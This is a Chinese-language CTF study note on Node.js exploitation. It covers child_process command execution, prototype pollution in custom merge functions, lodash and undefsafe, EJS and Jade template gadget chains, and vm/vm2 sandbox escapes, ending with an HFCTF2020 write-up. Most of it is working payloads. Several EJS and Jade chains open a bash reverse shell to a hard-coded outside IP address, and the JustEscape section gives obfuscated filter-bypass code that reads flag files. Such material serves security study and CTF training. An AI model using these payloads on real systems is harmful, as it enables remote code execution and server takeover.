<a name="rFBUl"></a>
# 写在前面
师傅太强了[https://boogipop.com/2023/03/02/Node.Js%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/#%E4%B8%80%E4%BA%9B%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0](https://boogipop.com/2023/03/02/Node.Js%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/#%E4%B8%80%E4%BA%9B%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0)
<a name="TazzF"></a>
# 
<a name="boMsO"></a>
# rce函数
<a name="GX1kB"></a>
## eval()
和php的eval类似，只不过要用nodejs特有的方法进行rce。

```javascript
spawn()，开启一个子进程用来执行命令。
exec(),启用子进程，可使用回调函数
execFile()，启用子进程用来执行可执行文件，实际上第一个参数可以是执行的命令。
fork()，用于执行恶意文件，需提前写入。
```
chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。<br />以上所有函数都是child_process模块中的函数
<a name="O6UMU"></a>
## exec()
```javascript
var process=require('child_process');
process.exec("whoami")
```
<a name="lt1Ri"></a>
## execFile
```javascript
require('child_process').execFile("ipconfig",{shell:true});
```
<a name="E4SJ7"></a>
## fork
```javascript
require('child_process').fork("./evil.js");
```
用于执行恶意文件，偏向js。
<a name="QpPY0"></a>
## spawn
```javascript
require('child_process').spawn("calc",{shell:true});
```
进行反弹shell：require('child_process').exec('echo SHELL_BASE_64|base64 -d|bash');或者bash -c "bash -i xxx"
<a name="aEzGz"></a>
## settimeout
两秒后执行函数，这里直接写个无参匿名函数。
```javascript
var express = require("express");
var app = express();

setTimeout(()=>{
    console.log("console.log('1919810')");
},2000);

var server = app.listen(1234,function(){
    console.log("114514");
})
//114514
//console.log('1919810')

```
<a name="I8ONr"></a>
# setinterval()
每两秒执行一次，可重复。
```javascript
var express = require("express");
var app = express();

setInterval(()=>{
    console.log("console.log('1919810')");
},2000);

var server = app.listen(1234,function(){
    console.log("114514");
})
/*114514
console.log('1919810')
console.log('1919810')
console.log('1919810')
console.log('1919810')
console.log('1919810')
console.log('1919810')
console.log('1919810')
console.log('1919810')
console.log('1919810')
console.log('1919810')
console.log('1919810')

```
<a name="GbZ9e"></a>
## function
function(string)()类似于creatfunction,初始化时执行一次
```javascript
var express = require("express");
var app = express();

var aaa = Function("console.log('1919810')")();

var server = app.listen(1234,function(){
    console.log("114514");
})
```
<a name="d9P9C"></a>
# 原型链污染
js的每个对象都有其原型对象prototype，这个对象相当于该对象的父类，js继承就靠__proto__和prototype完成。<br />经典的一个对象合并导致的原型链污染。
```javascript
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
```
这里接收两个对象，先对source对象进行一个遍历，互相之间没有的key会进行补充。<br />由于会对两个对象进行改变，因此不返回任意值。<br />但是如果将key改成__proto__会发生一些操作。
```javascript
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
var a={}
var b=JSON.parse('{"a":"test","__proto__":{"target":"flag"}}')
console.log(b)
merge(a,b)
console.log({}.target)
```
通过对一个json进行反序列化，b就变成了一个对象<br />对象里由键名为a，值为test的属性，以及键名为__proto__,值为{"target":"flag"}对象的属性。<br />然后对ab进行合并，由于a的__proto__属性变成了{"target":"flag"}这一对象，就导致a的原型对象<br />发生了改变，于是访问a的target属性时，a本身没有，就往a的原型对象上找，由于被污染成了我们想要的东西，<br />就把flag输出。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/32634994/1672215111389-c9d8d65a-e41d-441d-bdf7-8d8716fd55fb.png#averageHue=%23f7f7f7&clientId=u4f55d445-fa85-4&from=paste&id=ud120a74a&name=image.png&originHeight=888&originWidth=1110&originalType=url&ratio=1&rotation=0&showTitle=false&size=160339&status=done&style=none&taskId=ubced1485-7a59-483e-abf0-21423d01e51&title=#averageHue=%23f7f7f7&from=url&id=m2tMM&originHeight=888&originWidth=1110&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title=)
<a name="qFrSg"></a>
# lodash的原型链污染
Lodash是一个JavaScript实用库，提供了很多常用的函数，可以大幅提高JavaScript编程的效率。


<a name="FMzii"></a>
## lodash.defaultsDeep
lodash.defaultsDeep是一个JavaScript工具库Lodash中的一个方法，用于将多个对象深度合并成一个对象。它会遍历所有对象中的每一个属性，将它们递归地合并到一个新对象中，如果有属性名冲突，则后面的对象中的属性会覆盖前面的对象中的属性。
```javascript
const mergeFn = require('lodash').defaultsDeep;
const payload = '{"constructor": {"prototype": {"whoami": "Vulnerable"}}}'
function check() {
    var o={};
    mergeFn(o, JSON.parse(payload));
    if (({})[`a0`] === true) {
        console.log(`Vulnerable to Prototype Pollution via ${payload}`);
    }
}

check();
```
这里会将{}的构造函数污染。
<a name="tGAFG"></a>
## lodash.merge
```javascript
var lodash= require('lodash');
var payload = '{"__proto__":{"whoami":"Vulnerable"}}';

var a = {};
console.log("Before whoami: " + a.whoami);
lodash.mergeWith({}, JSON.parse(payload));
console.log("After whoami: " + a.whoami);
```
<a name="KnVgz"></a>
## lodash.mergeWith
lodash.mergeWith 是来自流行的 JavaScript 实用程序库 Lodash 的函数，它递归合并两个或多个对象。它类似于 lodash.merge ，但允许将定制器函数作为最后一个参数传入，该参数可用于自定义合并过程。<br />该对象是所有输入对象的深度合并。如果两个或多个输入对象具有相同的属性，则将使用该属性的最后一个对象的值。
```javascript
var lodash= require('lodash');
var payload = '{"__proto__":{"whoami":"Vulnerable"}}';

var a = {};
console.log("Before whoami: " + a.whoami);
lodash.mergeWith({}, JSON.parse(payload));
console.log("After whoami: " + a.whoami);
```
<a name="Nsxir"></a>
## lodash.set
```javascript
const _ = require('lodash');

var object = { 'a': [{ 'b': { 'c': 3 } }] };

_.set(object, 'a[0].b.c', 4);
console.log(object.a[0].b.c);
// => 4

_.set(object, 'x[0].y.z', 5);
console.log(object.x[0].y.z);
// => 5
//{ a: [ { b: [Object] } ], x: [ { y: [Object] } ] }

```
```javascript
var lodash= require('lodash');

var object_1 = { 'a': [{ 'b': { 'c': 3 } }] };
var object_2 = {}

console.log(object_1.whoami);
//lodash.setWith(object_2, 'object_2["__proto__"]["whoami"]', 'Vulnerable');
lodash.set(object_2, '__proto__.["whoami"]', 'Vulnerable');
console.log(object_1.whoami);
```
set能将object对象里面指定路径的值改变，在该例子中，首先通过键名获得数组，数组0锁定一个对象，对象调用b键名返回对象，该对象通过键名c返回3，于是set改变3为4<br />在下一个例子中，由于没有键名x及其路径，于是创建x，并赋值。<br />这里object2的原型对象直接指向了原始的object，是所有对象的最终原型，这个object的原型被污染了，导致object1的原型被污染了。
<a name="aHSM2"></a>
# lodash.setWith
同样也能接收额外一个参数，用于怎么处理，undefined的话按默认的来。<br />区别不大
```javascript
var lodash= require('lodash');

var object_1 = { 'a': [{ 'b': { 'c': 3 } }] };
var object_2 = {}

console.log(object_1.whoami);
//lodash.setWith(object_2, 'object_2["__proto__"]["whoami"]', 'Vulnerable');
lodash.setwith(object_2, '__proto__.["whoami"]', 'Vulnerable');
console.log(object_1.whoami);
```
<a name="GgCy9"></a>
# undersafe
Undefsafe是一个JavaScript库，它是一个递归的安全访问深度嵌套对象属性的工具，可以避免因为无法识别对象或属性而导致的错误。它的特点是可以安全地处理任何层次的嵌套对象，即使中间有undefined或null值也能正常工作。
```javascript
const undefsafe = require('undefsafe');

const obj = {
    foo: {
        bar: {
            baz: 42
        }
    }
};

// 使用undefsafe进行安全的属性访问
console.log(undefsafe(obj, 'foo.bar.baz'));// 42
console.log(obj);//{ foo: { bar: { baz: 42 } } }
undefsafe(obj,'foo.bar.baz','sss');
console.log(obj);//{ foo: { bar: { baz: 'sss' } } }


```
正常来说，直接访问对象的指定路径，能修改值。<br />对不存在赋值时，会在上层创建
```javascript
const undefsafe = require('undefsafe');

const obj = {
    foo: {
        bar: {
            baz: 42
        }
    }
};

// 使用undefsafe进行安全的属性访问
console.log(undefsafe(obj, 'foo.bar.baz'));// 42
console.log(obj);
undefsafe(obj,'foo.bar.baz','sss');
console.log(obj);

// 如果属性不存在则返回undefined
console.log(undefsafe(obj, 'foo.bar.qux')); // undefined
undefsafe(obj,'foo.f.qux','enterprise');
console.log(obj)
```
版本较新的undefsafe可能不会出现漏洞。<br />用它进行原型链污染。
```javascript
var a = require("undefsafe");
var object = {
    a: {
        b: {
            c: 1,
            d: [1,2,3],
            e: 'Hnusec'
        }
    }
};
var payload = "__proto__";
var target={"flag":"evil"}
a(object,payload,target);
console.log(object.flag);
```
通过undefsae修改原型属性，对object进行原型链污染。
```javascript
var a = require("undefsafe");
var object = {
    a: {
        b: {
            c: 1,
            d: [1,2,3],
            e: 'Hnusec'
        }
    }
};
var payload = "__proto__.toString";
a(object,payload,"evilstring");
console.log(object.toString);
```
原型对象的固有属性污染，toString或constructor。
<a name="yB8OA"></a>
# ejs
EJS（Embedded JavaScript）是一个简单的模板语言，允许在模板中嵌入 JavaScript 代码。它可以帮助开发人员轻松地生成 HTML 页面，并且易于学习和使用。<br />使用 EJS，可以将动态数据注入到模板中，以便在生成 HTML 页面时动态呈现这些数据。 EJS 具有基于模板的语法，支持使用控制流语句和循环语句，以及可以自定义模板标签的功能。
<a name="ASbgY"></a>
## 代码审计一波
```javascript
var createError = require('http-errors');
var express = require('express');
var ejs = require('ejs');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
var session = require('express-session');
var FileStore = require('session-file-store')(session);
var indexRouter = require('./routes/index');
var loginRouter = require('./routes/login');
var apiRouter = require('./routes/api');
var app = express();

//session
var identityKey = 'auth';
app.use(session({
  name: identityKey,
  secret: 'ctfshow_session_secret', 
  store: new FileStore(), 
  saveUninitialized: false, 
  resave: false,
  cookie: {
    maxAge: 60 * 60 * 1000 // 有效期，单位是毫秒
  }
}));
// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.engine('html', require('ejs').__express);
app.set('view engine', 'html');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/', indexRouter);
app.use('/login', loginRouter);
app.use('/api',apiRouter);

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  // var o ={}
  // console.log(o.__proto__)
  res.render('error');
});

module.exports = app;

```
```javascript
app.engine('html', require('ejs').__express);
```
 express.engine 方法用于向 Express 注册模板引擎。它将给定的回调函数设置为用于呈现视图的默认模板引擎。<br />这里就给html注册了个ejs引擎。<br />来看原型链污染
```javascript
var express = require('express');
var router = express.Router();
var utils = require('../utils/common');



/* GET home page.  */
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var user = new function(){
    this.userinfo = new function(){
    this.isVIP = false;
    this.isAdmin = false;
    this.isAuthor = false;     
    };
  }
  utils.copy(user.userinfo,req.body);
  if(user.userinfo.isAdmin){
   res.end(flag);
  }else{
   return res.json({ret_code: 2, ret_msg: '登录失败'});  
  }
  
  
});

module.exports = router;

```
utils.copy是EJS模板引擎中的一个工具方法，用于将源对象的属性复制到目标对象中。<br />构造payload
```javascript
{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/43.143.192.19/1145 0>&1\"');var __tmp2"}}}

```
在ejs.js里面
```javascript
if (opts.outputFunctionName) {
        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
      }
```
属性值给了prepended
```javascript
appended += '  return __output;' + '\n';
      this.source = prepended + this.source + appended;
```
给了this.source
```javascript
 ctor = Function;
fn = new ctor(opts.localsName + ', escapeFn, include, rethrow', src);
```
Function对象会创立一个新函数，但同时也会遇到eval()相似的安全问题。<br />具有 call() 和 apply() 方法，可以用于调用函数并指定 this 关键字和参数。
```javascript
return fn.apply(opts.context, [data || {}, escapeFn, include, rethrow]);
```
对象指向了opts.tontext,并将data传了进去,<br />最后通过命令执行调用。
<a name="yGiwE"></a>
# jade
师傅tql<br />[https://xz.aliyun.com/t/7025](https://xz.aliyun.com/t/7025)<br />先贴出链子
```javascript
{"__proto__":{"self":"true","line":"2,jade_debug[0].filename));return global.process.mainModule.require(\'child_process\').exec('bash -c \"bash -i >& /dev/tcp/43.143.192.19/1145 0>&1\"')//"}}

```
```javascript
{"__proto__":{"self":1,"line":"global.process.mainModule.require(\'child_process\').exec(\'calc\')"}}
```
```javascript
{"__proto__":{"__proto__": {"type":"Block","nodes":"","compileDebug":1,"self":1,"line":"global.process.mainModule.require('child_process').exec('calc')"}}}
```
```javascript
{"__proto__":{"compileDebug":1,"self":1,"line":"console.log(global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/43.143.192.19/1145 0>&1\"'))"}}
```
```javascript
{"__proto__":{"__proto__":{"type":"Code","self":1,"line":"global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/43.143.192.19/1145 0>&1\"')"}}}
```
在这覆盖compilDebug的值为true
```javascript
exports.__express = function (path, options, fn) {
  if (options.compileDebug == undefined && process.env.NODE_ENV === 'production') {
    options.compileDebug = false;
  }
  exports.renderFile(path, options, fn);
}
```
开启后，报错过程在编译模式
```javascript
exports.compile = function (str, options) {
  var options = options || {}
    , filename = options.filename
      ? utils.stringify(options.filename)
      : 'undefined'
    , fn;

  str = String(str);

  var parsed = parse(str, options);
```
覆盖self为true，不进入编译报错分支。
```javascript
{"__proto__":{"compileDebug":1,"self":1}}
```
```javascript
visit: function(node){
  var debug = this.debug;
  if (debug) {
    this.buf.push('jade_debug.unshift(new jade.DebugItem( ' + node.line
      + ', ' + (node.filename
        ? utils.stringify(node.filename)
        : 'jade_debug[0].filename')
      + ' ));');
  }
  // ...
  this.visitNode(node);
  if (debug) this.buf.push('jade_debug.shift();');
}
```
这里会node,line和nodefilename进行拼接，filename限制太多，选择污染line。<br />所以把line的值改成我们要注入的命令，就完成了命令注入。<br />正常情况下node.type值为tag/Block等等,然后调用相应函数.<br />污染的时候顺带type也得污染了
```javascript
visitCode 
visitBlockComment
visitComment
visitDoctype
visitMixinBlock
```
<a name="EJc0W"></a>
# vm沙盒逃逸
第一次接触沙盒这个概念，康康先。<br />Node.js提供了一个名为vm（虚拟机）的内置模块，用于创建沙箱环境来执行一些不受信任的代码。它的作用类似于浏览器中的iframe或Worker。<br />vm沙盒逃逸，就是拜托只能访问的vm上下文，获取全局变量global，然后rce.
```javascript
const util = require('util');
const vm = require('vm');
const sandbox = {
animal: 'cat',
count: 2
};
const script = new vm.Script('count += 1; name = "kitty";');
const context = vm.createContext(sandbox);
script.runInContext(context);
console.log(util.inspect(sandbox));
```
首先定义了一个sandboy对象，有两个属性。然后创建要给vm对象，并且设定了脚本内容，执行的时count+1,设立一个name=kitty的属性。vm.Script会返回对象。<br />随后又创立了一个createContext对象，该方法创建了一个新的沙盒环境，并将sandbox作为全局对象，script.runInContext(context)，以沙盒环境对象作为执行的作用域。最后检测sandbox。<br />util.inspect()是Node.js中提供的一个工具函数，用于将给定的对象转换为字符串。它通常用于调试和日志记录，将对象的内容转换为易于查看的字符串。
```javascript
const util = require('util');
  const vm = require('vm');
  global.globalVar = 3;
  const sandbox = { globalVar: 1 };
  vm.createContext(sandbox);
  vm.runInContext('globalVar *= 2;', sandbox);
  console.log(util.inspect(sandbox));
  console.log(util.inspect(globalVar)); 
```
这里globalVar分了两块，一块是当前作用域下的，另一块则是沙盒里面的，沙盒里面的给了sandbox，并存入沙盒环境，接着执行脚本，最后沙盒里面的glabalVar成了2，但当前全局域下的glabalVar没变。
```javascript
"use strict";
const vm = require("vm");
const y1 = vm.runInNewContext(`this.constructor.constructor('return process.env')()`);
console.log(y1);
```
这段代码会直接返回当前环境变量。<br />重点看一下runInNewContext的this指向，这里指向传给该方法的参数对象。<br />this对象的构造函数指向Function，Function的构造函数指向其constructor，这里的constructor能产生一个匿名函数annoymous，能生成以下代码。
```javascript
(function anonymous(
) {
return process.env
})
```
后面添加一对括号加以原地调用。
<a name="W9qIm"></a>
## 当this指向null
null比较特殊，没有原型链，不具有tostring和constructor属性。
```javascript
const vm = require('vm');
const script = `...`;
const sandbox = Object.create(null);
const context = vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log('Hello ' + res)
```
arguments.callee.caller可以返回函数的调用者。
```javascript
const vm = require('vm');
const script = 
`(() => {
    const a = {}
    a.toString = function () {
      const cc = arguments.callee.caller;
      const p = (cc.constructor.constructor('return process'))();
      return p.mainModule.require('child_process').execSync('whoami').toString()
    }
    return a
  })()`;

const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log('Hello ' + res)
```
自己带进去一段执行的脚本，让a的toString通过一个函数返回要给process对象，并且process对象里面包含了rce的攻击，returna，触发tostring，返回指定内容，在最后一对()用于执行。
<a name="YhLAK"></a>
## proxy劫持法
"Hook"函数通常是指在某个代码块执行前或执行后插入的自定义函数，可以通过在特定的代码位置挂载hook函数来改变代码执行的流程或者对代码进行跟踪、调试、记录等操作。<br />Hook函数常常应用在以下场景：<br />在代码块执行前，做一些预处理操作，比如：修改输入参数、记录操作日志、控制代码执行流程等。<br />在代码块执行后，做一些后续操作，比如：根据执行结果，处理一些逻辑、记录返回结果、打印日志等。<br />在实际的开发中，我们可以通过如下几种方式实现hook函数：<br />函数参数：可以将函数的钩子功能通过参数传递进来，然后在代码块中根据参数进行特定操作。<br />回调函数：可以将钩子函数作为回调函数传递进去，在代码块执行完成后调用。<br />AOP编程：通过改变函数的执行流程，将钩子函数织入到代码块中。可以使用类似装饰器、切面编程等方式实现。<br />Proxy代理：通过对函数进行代理，可以在代理中实现预处理或后处理等操作。

proxy就是一个hook函数，在我们去访问对象的属性时（不管是否存在）都会触发这个函数.


Proxy 构造函数接收两个参数：<br />target：被代理的目标对象；<br />handler：一个对象，属性名是hook函数，属性值是相应的钩子函数的实现。钩子函数会在对目标对象的操作被拦截时被调用。
```javascript
const vm = require("vm");

const script = 
`
(() =>{
    const a = new Proxy({}, {
        get: function(){
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('whoami').toString();
        }
    })
    return a
})()
`;
const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log(res.abc)
```
相当于在创建一个Proxy对象时，设置空target，在接受的函数里面，把之前恶意利用的函数写入get的值里面。<br />还可借助异常
```javascript
const vm = require("vm");

const script = 
`
    throw new Proxy({}, {
        get: function(){
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('whoami').toString();
        }
    })
`;
try {
    vm.runInContext(script, vm.createContext(Object.create(null)));
}catch(e) {
    console.log("error:" + e) 
}
```
```javascript
TypeError: string "�깬��\86139

```
报错但能正常整出rce回显。
<a name="xKWcO"></a>
# [HFCTF2020]JustEscape
沙盒逃逸参考：[https://github.com/patriksimek/vm2/issues/225](https://github.com/patriksimek/vm2/issues/225)<br />原始payload
```javascript
"use strict";
const {VM} = require('vm2');
const untrusted = '(' + function(){
	TypeError.prototype.get_process = f=>f.constructor("return process")();
	try{
		Object.preventExtensions(Buffer.from("")).a = 1;
	}catch(e){
		return e.get_process(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
	}
}+')()';
try{
	console.log(new VM().run(untrusted));
}catch(x){
	console.log(x);
}
```
```javascript
"use strict";
const {VM} = require('vm2');
const untrusted = '(' + function(){
	try{
		Buffer.from(new Proxy({}, {
			getOwnPropertyDescriptor(){
				throw f=>f.constructor("return process")();
			}
		}));
	}catch(e){
		return e(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
	}
}+')()';
try{
	console.log(new VM().run(untrusted));
}catch(x){
	console.log(x);
}
```
这里特意使用preventExtensions函数禁止Buffer添加新的属性，而Buffer.from是往buffer对象添加属性，这就导致了异常，于是执行catch语句，返回rce语句。<br />首先TypeError是一个构造函数，其原型是Object，这里将object原型的一个值赋值成后面函数的返回值。<br />后面函数通过constructor构造一个匿名函数，用的是单参数单语句的箭头函数，返回一个对象process。<br />至此object已被污染，后面访问get_process，若某一对象没有，必定访问object的get_process方法。<br />(()=>{})能让process被当成函数执行。<br />修改以下payload：
```javascript
(function (){
    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proes`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();
    try{
        Object.preventExtensions(Buffer.from(`114514`)).a = 1;
    }catch(e){
        return e[`${`${`get_proes`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /f*`).toString();
    }
})()
```
这里只用前面一段，且prototype process constructor等一些关键字被过滤，可以考虑${}里面套${}拼接法绕过<br />把.的拼接变成[]引用索引，同时套多层反引号和${}，用于绕过关键字。<br />复杂一点
```javascript
/run.php?code=(()=%3E{%20TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`]%20=%20f=%3Ef[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,`%20`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))();%20try{%20Object[`preventExtensions`](Buffer[`from`](``))[`a`]%20=%201;%20}catch(e){%20return%20e[`a`](()=%3E{})[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+%2fflag`)[`toString`]();%20}%20})()

```
这里用[join]方法采用(``)，可将数组所有元素拼接起来，相当于无参join。<br />然后特殊字符用url编码。
<a name="pTaJh"></a>
## tips
js可以使用Error().stack查看报错信息


<a name="VMhfR"></a>
# 结语
js大概就学到这了吧，总算是把一直以来不咋熟悉的技术给过了一遍，现在技术栈不够广，比赛的php越来越少了，每次看到js或java感觉自己无能为力，准备开java坑了。。。
